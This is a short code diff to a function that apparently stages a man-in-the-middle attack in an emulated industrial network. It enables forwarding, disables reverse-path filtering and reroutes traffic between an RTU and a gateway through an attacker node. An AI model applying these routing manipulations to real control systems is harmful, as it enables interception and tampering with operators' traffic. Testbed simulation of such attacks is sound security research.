@@ -22,9 +22,16 @@ def run_mitm_attack(net, rtu_name=DEFAULT_RTU_NAME, gateway_name=DEFAULT_GATEWAY
     gateway_ip = gateway.IP()
 
     attacker.cmd("sysctl -w net.ipv4.ip_forward=1")
+    attacker.cmd(f"ip route add 10.0.1.0/24 via 10.0.2.1")
+    attacker.cmd(f"sysctl -w net.ipv4.conf.all.rp_filter=0")
+    attacker.cmd(f"sysctl -w net.ipv4.conf.default.rp_filter=0")
+    
     rtu.cmd(f"ip route replace {gateway_ip} via {attacker_ctrl_ip}")
+    rtu.cmd(f"ip route add {gateway_ip}/32 via {attacker_ctrl_ip}")
     gateway.cmd(f"ip route replace {rtu_ip} via {attacker_ctrl_ip}")
 
+    print(f"ip route replace {gateway_ip} via {attacker_ctrl_ip}")
+    print(f"ip route replace {rtu_ip} via {attacker_ctrl_ip}")
     print(f"MITM active: {rtu_name} <-> {gateway_name} via {attacker_name} ({attacker_ctrl_ip})")
 
 
